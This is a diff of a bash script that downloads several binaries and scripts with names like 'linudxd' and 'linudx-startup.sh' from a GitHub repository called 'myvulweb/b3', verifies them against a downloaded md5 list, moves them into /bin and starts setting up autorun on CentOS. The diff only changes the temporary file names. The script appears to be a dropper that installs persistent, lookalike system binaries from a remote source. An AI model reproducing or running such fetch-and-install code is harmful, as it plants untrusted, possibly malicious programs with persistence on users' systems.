@@ -1,12 +1,12 @@
 #!/bin/bash
 #
 #down and checkmd5
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/alinudxd
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/alinudxt
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/alinudx-home
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/alinudx-ver.txt
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/alinudx-update.sh
-wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/alinudx-startup.sh
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxd -O /tmp/lainudxd
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudxt -O /tmp/lainudxt
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-home -O /tmp/lainudx-home
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-ver.txt -O /tmp/lainudx-ver.txt
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-update.sh -O /tmp/lainudx-update.sh
+wget https://raw.githubusercontent.com/myvulweb/b3/master/linudx-startup.sh -O /tmp/lainudx-startup.sh
 wget https://raw.githubusercontent.com/myvulweb/b3/master/md5 -O /tmp/mymd5
 
 check1=`cat /tmp/mymd5 | grep \`md5sum /tmp/alinudxt | cut -d " " -f1\``
@@ -62,12 +62,12 @@ rm -rf /bin/linudx-startup.sh
 #uninstall finish
 
 #copy files to /bin
-mv /tmp/alinudxd /bin/linudxd
-mv /tmp/alinudxt /bin/linudxt
-mv /tmp/alinudx-home /bin/linudx-home
-mv /tmp/alinudx-update.sh /bin/linudx-update.sh
-mv /tmp/alinudx-startup.sh /bin/linudx-startup.sh
-mv /tmp/alinudx-ver.txt /bin/linudx-ver.txt
+mv /tmp/lainudxd /bin/linudxd
+mv /tmp/lainudxt /bin/linudxt
+mv /tmp/lainudx-home /bin/linudx-home
+mv /tmp/lainudx-update.sh /bin/linudx-update.sh
+mv /tmp/lainudx-startup.sh /bin/linudx-startup.sh
+mv /tmp/lainudx-ver.txt /bin/linudx-ver.txt
 
 #add autorun for centos
 
